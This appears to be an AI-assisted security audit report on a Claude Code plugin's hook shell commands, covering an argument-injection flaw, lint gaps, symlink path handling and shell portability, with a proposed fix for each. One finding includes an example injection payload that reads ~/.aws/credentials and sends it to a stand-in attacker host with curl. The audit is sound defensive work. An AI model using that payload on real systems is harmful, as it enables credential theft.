# Lens L8 -- Security & Portability (Round 7)

**Tooling note (CA-130's class, 7+ consecutive rounds):** Write absent from this
lens's delivered runtime tool set. This report was transcribed by the
orchestrator from the lens agent's final message, after a stalled first attempt.

## Findings (L8: Security & Portability)

### P1-1 -- `$ARGUMENTS` interpolated into a shell command string, validated only *after* the sink

`plugins/edm/hooks/hooks.json:19` (and identically at `:32`, `:45`, `:58`,
`:71` -- all five `UserPromptExpansion` command hooks)

```sh
prefix=$(echo "$ARGUMENTS" | awk '{print $1}'); case "$prefix" in ''|*[!A-Za-z0-9_-]*) ... exit 2 ;; esac
```

The `case` allowlist is a good guard, but it runs **one statement too late**.
It validates `$prefix`, i.e. the *output* of a pipeline that has already
executed. Everything hinges on whether the host hands `$ARGUMENTS` to the hook
as an environment variable (safe -- the double quotes hold) or textually
substitutes it into the command string before invoking the shell (unsafe --
which is exactly what Claude Code does for `$ARGUMENTS` in slash-command
bodies, the closest documented analogue).

Exploitation scenario, if substitution is textual: a prompt of the form
`/edm:srd A"; curl -s https://attacker/$(cat ~/.aws/credentials|base64); "`
closes the double quote, runs arbitrary commands, and reopens it. The payload
executes on the `echo` line; the `case` guard never sees it. The trigger is
ordinary prompt text, so any prompt-injection vector that can get text into
the user's prompt (a pasted issue body, a fetched page the user forwards, a
teammate's ticket description) reaches a shell with the user's full
privileges -- no tool-permission prompt, because hooks are not tool calls.

Concrete fix (correct under either host semantics, so it does not require
settling the question first):
```sh
prefix=$(jq -r '.prompt // ""' <<<"$HOOK_STDIN" | awk '{print $2}')   # or read hook JSON from stdin directly
```
i.e. take the argument from the hook's stdin JSON rather than from an
interpolated template slot. If `$ARGUMENTS` must be used, assign it without a
shell-parsed line: `prefix=$(awk '{print $1}' <<'EDM_ARGS'` ... heredoc ...
`EDM_ARGS)` -- a quoted heredoc delimiter suppresses all expansion, so
injected quotes are inert. Verify which semantics apply and record it in
`plugins/edm/CLAUDE.md Sec."Hooks behavior"`; the current text documents the
exit-code contract but says nothing about the trust level of `$ARGUMENTS`.

### P1-2 -- the plugin's most privileged shell is the one shell no lint job checks

`plugins/edm/hooks/hooks.json:86` (the ~2,600-character `PreToolUse` command);
CI scope defined in `.gitlab-ci.yml`

Per `plugins/edm/CLAUDE.md Sec."CI (EDMV3-T21)"`, `lint:bash-syntax` covers
`bin/*`, `bin/tests/*.sh`, `evals/*.sh`, and `lint:shellcheck` covers the same
set scoped to SC2086/SC2046/SC2048/SC2068. **`hooks/hooks.json` is in neither
glob.** So the one piece of shell in this plugin that executes automatically,
with no permission prompt, on every `git commit` and every matching prompt
expansion, gets neither `bash -n` nor an unquoted-expansion check -- while
`bin/tests/*.sh` (which only ever runs when a human types it) gets both. That
inversion is the finding: lint rigor is anticorrelated with privilege.

This is also why P1-1, P2-1 and P2-2 below all survived six prior rounds in
this one file. Concrete fix -- add to `lint:bash-syntax`:
```sh
jq -r '.hooks | to_entries[] | .value[] | .hooks[] | select(.type=="command") | .command' \
  plugins/edm/hooks/hooks.json | while IFS= read -r c; do
    printf '%s\n' "$c" > "$tmp/hook.sh"; bash -n "$tmp/hook.sh" || exit 1
    shellcheck -s sh -i SC2086,SC2046,SC2048,SC2068 "$tmp/hook.sh" || exit 1
  done
```
Note `-s sh`, not `-s bash`: the host, not a shebang, picks the interpreter for
these strings, so `sh` is the correct dialect to assert against.

### P2-1 -- round-6's relativization fix is defeated by a symlinked repo path (macOS `/tmp`, `/var`)

`plugins/edm/hooks/hooks.json:86`

The fix itself verifies correct on its stated goal, and this deserves a
positive note: `check_dir="${repo_root:-.}/${srd_root}"` anchors both the
existence check and the child `EDM_SRD_ROOT` at the repo root rather than the
cwd, and `git -c diff.relative=false diff --cached --name-only` forces
repo-relative staged paths. Committing from a subdirectory no longer fails
open. The `..` rejection arm (`..|../*|*/..|*/../*`) and the trailing-`/` and
`/.` normalization loops are correct, and the `case` patterns quote the
variable part while leaving the glob unquoted (`"$repo_root"/*`,
`${srd_root#"$repo_root"/}`) -- the subtle part, done right, and bash-3.2-safe.

The residual gap is that relativization is **purely lexical**:
```sh
case "$srd_root" in "$repo_root") relativized="." ;; "$repo_root"/*) relativized="${srd_root#"$repo_root"/}" ;; esac
```
`git rev-parse --show-toplevel` returns the *physical* path. On macOS -- this
project's stated primary development platform (`bin/edm-state:633`) -- `/tmp`
is a symlink to `/private/tmp`, and `/var` to `/private/var`. A developer with
the repo at `/tmp/work` who sets `EDM_SRD_ROOT=/tmp/work/SRD` gets
`repo_root=/private/tmp/work`; the string prefix does not match, `relativized`
stays empty, and the hook takes its `exit 1` arm emitting *"srd_root is
absolute (/tmp/work/SRD) and could not be relativized under the repository
root (/private/tmp/work)"* -- a message that reads as a configuration error
when the path is in fact inside the repo. Since exit 1 is non-blocking by
design, the outcome is **commit-time artifact lint silently stops enforcing**
for that developer, for the rest of the initiative. Same failure for any
symlinked worktree path or symlinked home.

Fix: normalize both sides physically before comparing, guarding the
non-existent case:
```sh
phys_root=$(cd "$repo_root" 2>/dev/null && pwd -P) || phys_root="$repo_root"
phys_srd=$(cd "$srd_root" 2>/dev/null && pwd -P) || phys_srd="$srd_root"
```
then run the existing `case` against `$phys_srd` / `$phys_root`. Add a smoke
case that symlinks a scratch repo and asserts relativization still succeeds.

### P2-2 -- `echo "$staged"` plus git's default `core.quotePath` is interpreter-dependent

`plugins/edm/hooks/hooks.json:86`

`staged` is fed to `echo "$staged" | root=... awk ...`. Two portability
hazards compound. First, `git diff --cached --name-only` C-quotes any path
containing non-ASCII or backslash bytes by default (`core.quotePath=true`), so
`SRD/edm/X__y/a\b.md` arrives as the literal `"SRD/edm/X__y/a\\b.md"`. Second,
`echo`'s treatment of `\` is not portable: bash's builtin leaves it alone
without `-e`, but dash's and BusyBox ash's builtins expand escapes
unconditionally -- and the interpreter here is chosen by the host, not by a
shebang. On an ash-family host, an embedded `\n` becomes a real newline and one
staged path becomes two lines. The prefix-extraction `awk` then sees a
truncated first fragment, the `grep -E '^[A-Z][A-Z0-9_-]*$'` allowlist drops
it, and if that was the only staged file from that initiative the hook exits 0
without linting.

Not scored as an exploit: the actor who controls staged filenames is the
committer, who can bypass the hook outright with `--no-verify`. It is a
portability/robustness defect -- the hook behaves differently on macOS/bash
than on an Alpine/ash host, which matters because `test:smoke-bash32` and the
Alpine CI images make multiple interpreters a live condition. Fix: `git -c
core.quotePath=false -c diff.relative=false diff --cached --name-only`, and
`printf '%s\n' "$staged" | ...` in place of `echo` (the file already uses
`printf '%s\n'` correctly for the `$out` diagnostics two statements later, so
this is an internal-consistency fix too).

### P2-3 -- fd-200 rationale comment names the wrong reserved range, inviting a regression into the fd-9/10 hazard

`plugins/edm/bin/edm-state:1152`

> `# Fast path: flock on FD 200 (high enough to avoid collisions with stdin/stdout/stderr`

fd 200 is the right choice and the canonical `flock(1)` idiom -- no defect in
the code. But the stated *reason* is that 200 clears stdin/stdout/stderr, i.e.
fds 0-2. That rationale is satisfied by fd 3, fd 9 or fd 10 just as well, and
a future contributor economizing on "an absurdly high fd" would land on
exactly the two ranges that are actually dangerous: fd 9 is the conventional
`BASH_XTRACEFD` target (so `bash -x` tracing would clobber the lock), and fds
10+ are what bash uses internally for saved-descriptor bookkeeping during
redirections. The comment protects the code but not the invariant. Fix --
restate the real constraint: *"fd 200: clear of 0-2 (std streams), of 9
(conventional BASH_XTRACEFD), and of the 10+ band bash reserves for internal
redirection bookkeeping. Do not lower this."* Cheap, and it is the kind of
comment `wave7-smoke.sh` already asserts the presence of for the neighboring
CA-169 guard, so it can be pinned the same way.

## Noted / Not Actionable

- **`exit 1` (non-blocking) on both relativization refusals**, `hooks.json:86`
  -- matches `plugins/edm/CLAUDE.md Sec."Hooks behavior"` verbatim ("logs a
  diagnostic and exits without linting or blocking rather than silently
  enforcing nothing") and the documented exit-code contract where only exit 2
  blocks. Intentional.
- **`for p in $prefixes` unquoted word-split**, `hooks.json:86` -- the values
  are clamped upstream by `grep -E '^[A-Z][A-Z0-9_-]*$'`, so no token can
  contain whitespace or a glob metacharacter. Compensating control present;
  the split is the intent.
- **`root="$root_for_awk" awk '... ENVIRON["root"] ...'` instead of `awk
  -v`** -- deliberate hardening, not an oddity: `-v` reprocesses backslash
  escapes in the assigned value, so a path containing `\t` would be
  corrupted. Passing via the environment avoids that. Correct, and worth
  preserving against a future "simplify to `-v`" cleanup.
- **`EDM_SRD_ROOT="$check_dir" edm-lint-artifacts "$p"` per-command env
  prefix** -- correct propagation to the child without exporting into the
  hook's own environment or leaking to sibling commands. Verified good.
- **The hook refuses an absolute `EDM_SRD_ROOT` yet hands an absolute
  `$check_dir` to its own children** -- not a bug, and correct: the hook
  needs a repo-relative value to string-match staged paths, whereas
  `edm-state resolve-dir` / `edm-lint-artifacts` resolve directories and want
  an absolute root. Recording it because the asymmetry looks like an
  inconsistency and a future contributor could "fix" the children into
  rejecting absolutes and break the hook. Worth one inline comment.
- **`/Users/darryl.porter/projects/caveman` and `/Users/darryl.porter/
  projects/ponytail`**, `plugins/edm/CLAUDE.md:366,374` -- hardcoded
  developer-machine paths in a shipped plugin, but they are prose in a
  licence-provenance record that explicitly states it is recording a local
  inspection ("The URL above is that clone's `origin` remote, not a link
  re-fetched over the network from this environment"). Naming the machine is
  the point of the record. Not executable, no portability impact. (Optional
  polish: cite repo + commit SHA alongside the path.)
- **All temp-file creation uses `mktemp` with an `XXXXXX` template** --
  `bin/edm-check-grants:123`, `bin/edm-lint-artifacts:133,140`,
  `bin/edm-sync-canonical-sections:81`, `evals/run-eval.sh:266`,
  `evals/tiering-matrix.sh:147`; all honor `${TMPDIR:-/tmp}`; `mktemp -d`
  yields mode 700. No predictable-path symlink-plant target remains,
  consistent with round 6's flock-marker fix. Verified good.
- **No fd 9 or fd 10-19 usage anywhere in `bin/`** -- the only numbered fd in
  the tree is flock's 200 (see P2-3), and the only `BASH_XTRACEFD` mention is
  descriptive text in `agents/edm-audit-security.md:24`. Clean.
- **`.edm-state.json` written at the ambient umask (typically 644), no
  explicit `chmod`/`umask`** -- not a secret-file exposure: `plugins/edm/
  CLAUDE.md` Architectural rule 3 makes this file a deliberately git-
  committed project deliverable. 644 is correct.
- **`chmod 555` / `chmod 755` / `chmod +x`** at `bin/tests/wave6-smoke.sh:
  413,4380,4383` and `bin/tests/wave7-smoke.sh:296` -- test-only fixture and
  PATH-shim setup, with `555` immediately restored to `755`. Development-only
  context.
- **`$ARGUMENTS` inside the `prompt`-type hooks** (`hooks.json:23,36,49,62,
  75`) -- reaches a model as prose, not a shell. The content originates in
  the user's own prompt, so there is no trust boundary crossed that was not
  already crossed. Distinct from P1-1, which is a shell sink.

## Coverage gaps in this round (not audited -- carry to round 8)

Reached the report deadline before covering: (a) trap/cleanup coverage for the
two `mktemp` files in `bin/edm-lint-artifacts:133,140` on early-`die` paths;
(b) argument-injection review of `bin/edm-state`'s 39 subcommand handlers,
particularly `cmd_set`, `cmd_record_partial_verdict` and `migrate-path` where
free-text values (`rationale`, `verification_ref`, `--description`) reach
`jq` and `git mv`; (c) the prompt-construction heredocs in
`evals/run-eval.sh:440-510`; (d) whether any `wave*-smoke.sh` case actually
asserts the round-6 subdirectory-commit relativization behavior end to end,
or only greps for it -- P2-1 above suggests the symlink axis is untested
either way.
</content>
